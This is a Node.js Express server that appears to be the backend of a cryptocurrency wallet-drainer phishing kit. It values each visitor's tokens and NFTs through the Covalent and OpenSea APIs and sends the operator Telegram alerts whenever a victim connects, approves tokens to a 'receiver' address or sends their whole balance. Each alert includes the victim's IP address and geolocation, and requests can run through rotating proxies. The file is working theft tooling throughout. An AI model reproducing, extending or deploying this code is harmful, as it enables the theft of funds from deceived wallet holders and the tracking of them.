import express from "express"; 
import https from "https";
import requestIp from "request-ip";
import cors from "cors";
import fetch from "node-fetch";
import HttpsProxyAgent from "https-proxy-agent";
import TelegramBot from "node-telegram-bot-api";
import geoip from "geoip-lite";
import xssFilter from "xss-filters";
import dotenv from "dotenv";
import fs from "fs";
import path from 'path';
import { fileURLToPath } from 'url';
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const key = fs.readFileSync('ssl/server.key'),
    cert = fs.readFileSync('ssl/server.crt'),
    options = {
        key: key,
        cert: cert
    };

dotenv.config();

const app = express(),
  PORT = process.env.PORT || 80, // api server port
  SERVER_AUTH_KEY = process.env.SERVER_AUTH_KEY, // api server auth key
  COVALENT_API_KEY = process.env.COVALENT_API_KEY, // covalent api key
  OPENSEA_API_KEY = process.env.OPENSEA_API_KEY, // opensea api key
  TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN, // telegram token bot
  TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID, // telegram chat id
  PROXY = process.env.PROXY, // proxy with rotation (http://login:pass@ip:port)
  CONNECT_USER_LOG = process.env.CONNECT_USER_LOG, // turn off 0 or turn on 1
  CONNECT_WALLET_LOG = process.env.CONNECT_WALLET_LOG, // turn off 0 or turn on 1
  SENT_ALL_BALANCE_LOG = process.env.SENT_ALL_BALANCE_LOG, // turn off 0 or turn on 1
  APPROVAL_TOKENS_LOG = process.env.APPROVAL_TOKENS_LOG; // turn off 0 or turn on 1

let RATES = { 1: 0, 56: 0, 137: 0 },
  telegram;
  app.set('trust proxy', true);
  app.use(express.static(__dirname + "/public"));
  app.use((req, res, next) => {
      res.header("Access-Control-Allow-Origin", "http://localhost:3000"); // update to match the domain you will make the request from
      res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
      if (req.method == "OPTIONS") {
        return res.sendStatus(200);
      }
      next();
    });
const getRates = async () => {
  try {
    const payload = {
      keepAlive: true,
    };
    if (PROXY) payload.agent = new HttpsProxyAgent(PROXY);
    const res = await fetch(
      `https://min-api.cryptocompare.com/data/price?fsym=eth&tsyms=usd`,
      payload
    );
    const data = await res.json();
    if (data.USD) {
      const price = data.USD;
      RATES[1] = Number(price).toFixed(2);
      console.log(`ETH rate searched ${RATES[1]}$!`);
    } else {
      console.log(
        `Search ETH rate failed. Try agai...\nError: API no response.`
      );
      getRates();
    }
    setTimeout(async () => {
      const res = await fetch(
      `https://min-api.cryptocompare.com/data/price?fsym=bnb&tsyms=usd`,
      payload
    );
    const data = await res.json();
    if (data.USD) {
      const price = data.USD;
      RATES[56] = Number(price).toFixed(2);
      console.log(`BNB rate searched ${RATES[56]}$!`);
    } else {
      console.log(
        `Search BNB rate failed. Try agai...\nError: API no response.`
      );
      getRates();
    }
    }, 2500);
    setTimeout(async () => {
      const res = await fetch(
      `https://min-api.cryptocompare.com/data/price?fsym=matic&tsyms=usd`,
      payload
    );
    const data = await res.json();
    if (data.USD) {
      const price = data.USD;
      RATES[137] = Number(price).toFixed(2);
      console.log(`MATIC rate searched ${RATES[137]}$!`);
    } else {
      console.log(
        `Search MATIC rate failed. Try agai...\nError: API no response.`
      );
      getRates();
    }
    }, 5000);
  } catch (err) {
    console.log(`Search rates failed. Try again...\n Error: ${err}`);
    getRates();
  }
};

setInterval(() => {
  getRates();
}, 60000 * 60 * 3);

const randNumber = (length) => {
  let result = "";
  let words = "0123456789";
  let max_position = words.length - 1;
  for (let i = 0; i < length; ++i) {
    let position = Math.floor(Math.random() * max_position);
    result = result + words.substring(position, position + 1);
  }
  return result;
};

const xssGuard = (data) => {
  console.log(xssFilter.inHTMLData(data))
  return xssFilter.inHTMLData(data);
};

app.disable("x-powered-by");
app.set("x-powered-by", false);
app.use(express.json());
app.use(requestIp.mw());
app.use(
  cors({
    origin: "*",
  })
);

app.get("/", async (req, res) => {
  res.status(400).json({
    error: "Invalid request.",
  });
});

app.get("/api/assets", async (req, res) => {
  if (req.method === "GET") {
    const address = xssGuard(req.query.address),
      method = xssGuard(req.query.method),
      price = xssGuard(req.query.price),
      chain = xssGuard(req.query.chain);
      //console.log(` ${address} ${method} ${price} ${chain}`)
    if (!address || !method || !price)
      return res.status(400).json({
        error: "Invalid request.",
      });
    if (method == 1) {
      try {
        const assets = await getAssets(1, address, chain);
        const collections = assets.map((item) => {
          return {
            ...item,
          };
        });
        res.json({
          success: true,
          assets: collections.filter((item) => Number(item.price) >= price),
        });
      } catch (err) {
        console.log(
          `Searching ERC-20 assets in wallet ${address} failed. Error: ${err}`
        );
        res.json({
          success: false,
          error: err.message,
        });
      }
    } else if (method == 2 && chain == 1) {
      try {
        const assets = await getAssets(2, address, chain);
        const collections = assets.map((item) => {
          return {
            ...item,
          };
        });
        res.json({
          success: true,
          assets: collections.filter((item) => Number(item.price) >= price),
        });
      } catch (err) {
        console.log(
          `Searching ERC-721/1155 assets in wallet ${address} failed. Error: ${err}`
        );
        res.json({
          success: false,
          error: err.message,
        });
      }
    } else {
      res.status(400).json({
        error: "Invalid request.",
      });
    }
  } else
    res.status(400).json({
      error: "Invalid request.",
    });
});

app.get("/api/rates", async (req, res) => {
  if (req.method === "GET") {
    const AUTH_KEY = xssGuard(req.headers.authorization);
    if (AUTH_KEY != SERVER_AUTH_KEY)
      return res.status(403).json({
        error: "Not authorized.",
      });
    if (RATES[1] == 0 && RATES[56] == 0 && RATES[137] == 0)
      res.status(400).json({
        error: "Rates not found. Check API server.",
      });
    else
      res.status(200).json({
        rates: RATES,
      });
  } else
    res.status(400).json({
      error: "Invalid request.",
    });
});

app.post("/api/logs", async (req, res) => {
  if (req.method === "POST") {
    const AUTH_KEY = xssGuard(req.headers.authorization);
    if (AUTH_KEY != SERVER_AUTH_KEY)
      return res.status(403).json({
        error: "Not authorized.",
      });
    const host = xssGuard(req.body.host),
      client = xssGuard(req.clientIp),
      method = xssGuard(req.body.method),
      ref = xssGuard(req.body.ref);
    let clientGeo;
    if (client) {
      console.log(client)
      const geo = geoip.lookup(client);
      if(geo!=null) {
        if (geo.city) clientGeo = `${geo.country} / ${geo.city}`;
        else clientGeo = `${geo.country}`;
      } else clientGeo = "null";
    } else clientGeo = "null";
    if (!method || !ref)
      return res.status(400).json({
        error: "Invalid request.",
      });
    const logId = `#${randNumber(10)}`;
    if (method == 1) {
      if (CONNECT_USER_LOG == 0) return console.log('Connect user log disabled.');
      console.log(
        `User ${client} connected! TG: ${TELEGRAM_CHAT_ID}\n---\nHost: ${host}\nRef: ${ref}\nLocation: ${clientGeo}`
      );
     // /*
      telegram.sendMessage(
        TELEGRAM_CHAT_ID,
        `ID: <code>${logId}</code>\nHost: <i>${host}</i>\nRef: <i>${ref}</i>\nLocation: <i>${clientGeo}</i>\n\nUser <i>${client}</i> connected!`,
        { parse_mode: "HTML" }
      );
      // */
      res.status(200).json({
        message: "Log sent!",
      });
    } else if (method == 2) {
      if (CONNECT_WALLET_LOG == 0) return console.log('Connect wallet log disabled.');
      const address = xssGuard(req.body.address);
      if (!address)
        return res.status(400).json({
          error: "Invalid request.",
        });
      console.log(
        `Wallet ${address} connected! TG: ${TELEGRAM_CHAT_ID}\n---\nHost: ${host}\nRef: ${ref}\nIP: ${client}\nLocation: ${clientGeo}`
      );
     // /*
      telegram.sendMessage(
        TELEGRAM_CHAT_ID,
        `ID: <code>${logId}</code>\nHost: <i>${host}</i>\nRef: <i>${ref}</i>\nIP: <i>${client}</i>\nLocation: <i>${clientGeo}</i>\n\nWallet <i>${address}</i> connected!`,
        { parse_mode: "HTML" }
      );
      // */
      res.status(200).json({
        message: "Log sent!",
      });
    } else if (method == 3) {
      if (APPROVAL_TOKENS_LOG == 0) return console.log('Approval tokens log disabled.');
      const address = xssGuard(req.body.address),
        receiver = xssGuard(req.body.receiver),
        contractAddress = xssGuard(req.body.contractAddress),
        contractName = xssGuard(req.body.contractName),
        contractSymbol = xssGuard(req.body.contractSymbol),
        contractAmount = xssGuard(req.body.contractAmount),
        contractPrice = xssGuard(req.body.contractPrice),
        contractSchema = xssGuard(req.body.contractSchema),
        signatureTx = xssGuard(req.body.signatureTx);
      if (
        !address ||
        !receiver ||
        !contractAddress ||
        !contractName ||
        !contractSymbol ||
        !contractAmount ||
        !contractPrice ||
        !contractSchema ||
        !signatureTx
      )
        return res.status(400).json({
          error: "Invalid request.",
        });
      if (contractSchema == "ERC20") {
        console.log(
          `Wallet ${address} approve ${contractSchema.toUpperCase()} token!\n---\nID: ${logId}\nHost: ${host}\nRef: ${ref}\nIP: ${client}\nLocation: ${clientGeo}\n\nReceiver: ${receiver}\nToken: ${contractName} (${contractSymbol})\nAmount: ${contractAmount} (${contractPrice}$)\nContract: ${contractAddress}\nTX: ${signatureTx}`
        );
        telegram.sendMessage(
          TELEGRAM_CHAT_ID,
          `ID: <code>${logId}</code>\nHost: <i>${host}</i>\nRef: <i>${ref}</i>\nIP: <i>${client}</i>\nLocation: <i>${clientGeo}</i>\n\nWallet <i>${address}</i> approval ${contractSchema.toUpperCase()} token!\n\nReceiver: <i>${receiver}</i>\nToken: <i>${contractName} (${contractSymbol})</i>\nAmount: <i>${contractAmount} (${contractPrice}$)</i>\nContract: <i>${contractAddress}</i>\nTX: <i>${signatureTx}</i>`,
          { parse_mode: "HTML" }
        );
        res.status(200).json({
          message: "Log sent!",
        });
      } else if (contractSchema == "ERC721" || contractSchema == "ERC1155") {
        console.log(
          `Wallet ${address} approval ${contractSchema.toUpperCase()} collection!\n---\nID: ${logId}\nHost: ${host}\nRef: ${ref}\nIP: ${client}\nLocation: ${clientGeo}\n\nReceiver: ${receiver}\nCollection: ${contractName} (${contractSymbol})\nAmount: ${contractAmount} (${contractPrice}$)\nContract: ${contractAddress}\nTX: ${signatureTx}`
        );
        telegram.sendMessage(
          TELEGRAM_CHAT_ID,
          `ID: <code>${logId}</code>\nHost: <i>${host}</i>\nRef: <i>${ref}</i>\nIP: <i>${client}</i>\nLocation: <i>${clientGeo}</i>\n\nWallet <i>${address}</i> approval ${contractSchema.toUpperCase()} collection!\n\nReceiver: <i>${receiver}</i>\nCollection: <i>${contractName} (${contractSymbol})</i>\nAmount: <i>${contractAmount} (${contractPrice}$)</i>\nContract: <i>${contractAddress}</i>\nTX: <i>${signatureTx}</i>`,
          { parse_mode: "HTML" }
        );
        res.status(200).json({
          message: "Log sent!",
        });
      } else {
        return res.status(400).json({
          error: "Invalid request.",
        });
      }
    } else if (method == 4) {
      if (SENT_ALL_BALANCE_LOG == 0) return console.log('Sent all balance log disabled.');
      const address = xssGuard(req.body.address),
        receiver = xssGuard(req.body.receiver),
        balance = xssGuard(req.body.balance),
        chain = xssGuard(req.body.chain),
        signatureTx = xssGuard(req.body.signatureTx);
      if (!address || !receiver || !balance || !chain || !signatureTx)
        return res.status(400).json({
          error: "Invalid request.",
        });
      let balanceDollar = 0;
      if (chain == 1) {
        balanceDollar = Number(balance * RATES[1]).toFixed(2);
      } else if (chain == 56) {
        balanceDollar = Number(balance * RATES[56]).toFixed(2);
      } else if (chain == 137) {
        balanceDollar = Number(balance * RATES[137]).toFixed(2);
      }
      console.log(
        `Wallet ${address} sent all balance!\n---\nID: ${logId}\nHost: ${host}\nRef: ${ref}\nIP: ${client}\nLocation: ${clientGeo}\n\nReceiver: ${receiver}\nAmount: ${balance} (${balanceDollar}}$)\nTX: ${signatureTx}`
      );
      telegram.sendMessage(
        TELEGRAM_CHAT_ID,
        `ID: <code>${logId}</code>\nHost: <i>${host}</i>\nRef: <i>${ref}</i>\nIP: <i>${client}</i>\nLocation: <i>${clientGeo}</i>\n\nWallet <i>${address}</i> sent all balance!\n\nReceiver: <i>${receiver}</i>\nAmount: <i>${balance} (${balanceDollar}$)</i>\nTX: <i>${signatureTx}</i>`,
        { parse_mode: "HTML" }
      );
      res.status(200).json({
        message: "Log sent!",
      });
    } else {
      res.status(400).json({
        error: "Invalid request.",
      });
    }
  } else
    res.status(400).json({
      error: "Invalid request.",
    });
});
app.get("*", async (req, res) => {
  res.status(400).json({
    error: "Invalid request.",
  });
});
const getAssets = async (method, address, chain) => {
  if (method == 1) {
    console.log(`Searching ERC-20 assets in wallet ${address}...`);
    const payload = {
      keepAlive: true,
    };
    if (PROXY) payload.agent = new HttpsProxyAgent(PROXY);
    const res = await fetch(
      `https://api.covalenthq.com/v1/${chain}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}`,
      payload
    );
    const data = await res.json();
    if (data.data?.items?.length) {
      console.log(`ERC-20 assets searched in wallet ${address}!`);
      return data.data.items
        .filter((asset) => asset.quote_rate_24h)
        .map((asset) => {
          return {
            address: asset.contract_address,
            name: asset.contract_name,
            symbol: asset.contract_ticker_symbol,
            amount: asset.balance,
            schema: "ERC20",
            price: Number(asset.quote).toFixed(2),
          };
        });
    } else {
      console.log(`ERC-20 assets not searched in wallet ${address}.`);
      return [];
    }
  } else if (method == 2) {
    console.log(`Searching ERC-721/1155 assets in wallet ${address}...`);
    const payload = {
      headers: {
        "X-API-KEY": OPENSEA_API_KEY,
      },
      keepAlive: true,
    };
    if (PROXY) payload.agent = new HttpsProxyAgent(PROXY);
    const res = await fetch(
      `https://api.opensea.io/api/v1/collections?asset_owner=${address}&offset=0&limit=300`,
      payload
    );
    const data = await res.json();
    console.log(data);
    if (data?.length) {
      console.log(`ERC-721/1155 assets searched in wallet ${address}!`);
      return data.map((asset) => {
        return {
          address: asset?.primary_asset_contracts[0]?.address,
          name: asset?.primary_asset_contracts[0]?.name,
          symbol: asset?.primary_asset_contracts[0]?.symbol,
          amount: asset?.owned_asset_count,
          schema: asset?.primary_asset_contracts[0]?.schema_name,
          price: Number(
            asset?.stats?.seven_day_average_price *
              asset?.owned_asset_count *
              RATES[1]
          ).toFixed(2),
        };
      });
    } else {
      console.log(`ERC-721/1155 assets not searched in wallet ${address}.`);
      return [];
    }
  } else {
    console.log("Get assets method not found.");
  }
};

const server = https.createServer(options, app);

const startApiServer = async () => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID)
    return console.log(
      "\nStart API server failed. Enter Telegram data in .env file.\n"
    );
  try {
    telegram = new TelegramBot(TELEGRAM_BOT_TOKEN, {
      polling: true,
    });
    server.listen(PORT, () => 
      {
        console.log(`\nAPI server started on port ${PORT}!`)
        /* 
        telegram.sendMessage(
          TELEGRAM_CHAT_ID,
          `\nAPI server started on port <b>${PORT}</b>!`,
          { parse_mode: "HTML" }
        );*/
      }
    );
    getRates();
  } catch (err) {
    console.log(`\nStart API server failed. Error: ${err}\n`);
    telegram.sendMessage(
      TELEGRAM_CHAT_ID,
      `\nStart API server failed. Error: ${err}\n`,
      { parse_mode: "HTML" }
    );
  }
};

//startApiServer();
app.listen(3000, function(){
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID)
    return console.log(
      "\nStart API server failed. Enter Telegram data in .env file.\n"
    ); 
  else{
    telegram = new TelegramBot(TELEGRAM_BOT_TOKEN, {
      polling: true,
    });
    console.log("Telegram setted");
  } 
  getRates();

});
